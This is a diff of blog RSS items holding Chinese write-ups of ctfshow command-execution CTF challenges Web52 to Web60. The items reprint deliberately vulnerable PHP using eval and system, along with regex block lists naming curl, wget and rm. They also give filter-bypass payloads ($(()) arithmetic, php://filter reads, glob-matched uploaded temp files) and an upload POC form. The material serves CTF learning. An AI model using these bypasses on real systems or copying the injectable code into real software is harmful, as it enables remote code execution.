+&lt;p&gt;&lt;a href=&#34;..%5CWeb55.md&#34;&gt;Web55&lt;/a&gt;base64及biz2方法无法使用，使用&lt;code&gt;.&lt;/code&gt;读取post传参文件方法不再赘述&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;上传payloda获得flag&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web57</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/</link>
+      <pubDate>Thu, 13 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250313165824616&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313165824616.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;$(())=0构造&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-08 01:02:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+// 还能炫的动吗？
+//flag in 36.php
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|[a-z]|[0-9]|\`|\|\#|\&amp;#39;|\&amp;#34;|\`|\%|\x09|\x26|\x0a|\&amp;gt;|\&amp;lt;|\.|\,|\?|\*|\-|\=|\[/i&amp;#34;, $c)){
+        system(&amp;#34;cat &amp;#34;.$c.&amp;#34;.php&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;源码审计&lt;/p&gt;
+&lt;p&gt;由注释可得flag位于&lt;code&gt;36.php&lt;/code&gt;中&lt;/p&gt;
+&lt;p&gt;preg_match过滤字段新增大量通配符,无法模糊匹配&lt;/p&gt;
+&lt;p&gt;sytem直接运行&lt;code&gt;cat $c.php&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;构造payload思路:&lt;/p&gt;
+&lt;p&gt;linux有&lt;code&gt;(())&lt;/code&gt;进行整数运算,内部可以放置表达式，默认相加。&lt;/p&gt;
+&lt;p&gt;此时有&lt;code&gt;$(())=0&lt;/code&gt; &lt;code&gt;$((~ $(()) ))=-1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;35的构造payload如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(($((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))$((&lt;/span&gt;~&lt;span style=&#34;color:#66d9ef&#34;&gt;$(())))))))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;提交payload，获得flag&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web58</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/</link>
+      <pubDate>Thu, 13 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250313180540068&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313180540068.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;POST方法修改，system函数禁用绕过&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;源码审计&lt;/p&gt;
+&lt;p&gt;此题使用post传参并执行&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;构造payload思路：&lt;/p&gt;
+&lt;p&gt;猜测此题无过滤，使用post直接传参命令执行&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250313181236803&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313181236803.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;传参提交后发现此题system命令被禁用&lt;/p&gt;
+&lt;p&gt;尝试使用&lt;code&gt;print_r(scandir(&#39;./&#39;))&lt;/code&gt;查看当前目录(&lt;code&gt;glob()&lt;/code&gt;也可使用)&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250313182730382&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313182730382.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;include函数+伪协议构造payload查看flag.php&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;php://filter/read=convert.base64-encode/resource=flag.php
+&lt;/code&gt;&lt;/pre&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184141171.png&#34; alt=&#34;image-20250313184141171&#34;  /&gt;
+&lt;p&gt;base64解码后获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250313184219672&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184219672.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web59</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web59/</link>
+      <pubDate>Thu, 13 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web59/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250313184412882&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313184412882.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;POST方法修改，system函数禁用绕过&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;审计后猜测与Web58类似&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;实际尝试后与Web58雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web60</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web60/</link>
+      <pubDate>Thu, 13 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web60/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250313185714133&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313185714133.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;猜测与Web58类似&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;实际操作雷同&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web52</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/</link>
+      <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250311164017025&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311164017025.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过及RCE重定向截断&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:50:30
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&amp;gt;|\&amp;lt;/i&amp;#34;, $c)){
+        system($c.&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;审计源码&lt;/p&gt;
+&lt;p&gt;过滤字段新增&lt;code&gt;&amp;gt; &amp;lt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;标准输出被重定向&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;构造payload思路：使用&lt;a href=&#34;......%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2.md&#34;&gt;${IFS}&lt;/a&gt;替代&lt;code&gt;&amp;gt;&lt;/code&gt;以替代空格，使用&lt;code&gt;||&lt;/code&gt;进行截断&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;目录扫描过程此处不再赘述&lt;/p&gt;
+&lt;p&gt;提交payload，获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250311165921891&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311165921891.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web53</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web53/</link>
+      <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web53/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250311171030265&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311171030265.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;preg_match过滤绕过&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 18:21:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&amp;gt;|\&amp;lt;/i&amp;#34;, $c)){
+        echo($c);
+        $d = system($c);
+        echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;.$d;
+    }else{
+        echo &amp;#39;no&amp;#39;;
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;p&gt;过滤字段无新增&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;构造payload时仅需考虑绕过preg_match即可&lt;/p&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250311171735515&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311171735515.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web54</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web54/</link>
+      <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web54/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250311174501132&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311174501132.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;preg_match过滤&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:43:42
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&amp;gt;|\&amp;lt;/i&amp;#34;, $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;p&gt;按顺序过滤字段，无法再使用字符拼接&lt;/p&gt;
+&lt;p&gt;被过滤命令包括&lt;code&gt;cat flag more wget less head sort tail sed cut tac awk strings od curl nl scp rm&lt;/code&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web55</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/</link>
+      <pubDate>Tue, 11 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250311180114209&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250311180114209.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;linux文件上传,&lt;code&gt;.&lt;/code&gt;读取，&lt;code&gt;glob&lt;/code&gt;正则&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 20:03:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|[a-z]|\`|\%|\x09|\x26|\&amp;gt;|\&amp;lt;/i&amp;#34;, $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTE]&lt;/p&gt;
+&lt;p&gt;代码审计&lt;/p&gt;
+&lt;p&gt;过滤字段新增字母大小写过滤&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;构造payload思路&#34;&gt;构造payload思路：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;过滤字段无数字，尝试使用纯通配符匹配/bin/base64 flag.php&lt;/li&gt;
+&lt;li&gt;过滤字段无数字，尝试使用纯通配符匹配/bin/bzip2 flag.php以压缩flag.php进行下载&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../../../web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce.md&#34;&gt;无数字RCE&lt;/a&gt;构造,此题未过滤&lt;code&gt;.&lt;/code&gt;。而在linux中,&lt;code&gt;.&lt;/code&gt;可以执行一个文件中的命令，比如&lt;code&gt;.file&lt;/code&gt;就是执行file文件中的命令。所以本题可以==post上传一个包含命令==的文件，然后通过&lt;code&gt;.&lt;/code&gt;来执行文件中的命令即可读到flag。&lt;/li&gt;
+&lt;li&gt;在linux中，被post上传的文件通常位于&lt;code&gt;/tmp/phpXXXXXX&lt;/code&gt;目录下（后六位为随机生成的字母）。故可以使用通配符&lt;code&gt;/???/?????????&lt;/code&gt;匹配。&lt;/li&gt;
+&lt;li&gt;通常情况下，tmp的类似文件名的文件有多个，与正则表达式类似，&lt;a href=&#34;../../../../web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/glob%E9%80%9A%E9%85%8D%E7%AC%A6.html&#34;&gt;glob&lt;/a&gt;支持利用[0-9]来表示一个范围，所以我们可以用[A-Z]来匹配文件的最后一位，但因为过滤了字母，需要把A改为A的前一位&lt;code&gt;@&lt;/code&gt;，把Z改为Z的后一位&lt;code&gt;[&lt;/code&gt;来匹配大写字母。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;0x03&#34;&gt;0x03&lt;/h2&gt;
+&lt;p&gt;命令执行POC（也可使用hackbar）&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+    &amp;lt;title&amp;gt;POST数据包POC&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;form action=&amp;#34;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&amp;#34; method=&amp;#34;post&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
+&amp;lt;!--链接是当前打开的题目链接--&amp;gt;
+    &amp;lt;label for=&amp;#34;file&amp;#34;&amp;gt;文件名：&amp;lt;/label&amp;gt;
+    &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;file&amp;#34; id=&amp;#34;file&amp;#34;&amp;gt;&amp;lt;br&amp;gt;
+    &amp;lt;input type=&amp;#34;submit&amp;#34; name=&amp;#34;submit&amp;#34; value=&amp;#34;提交&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
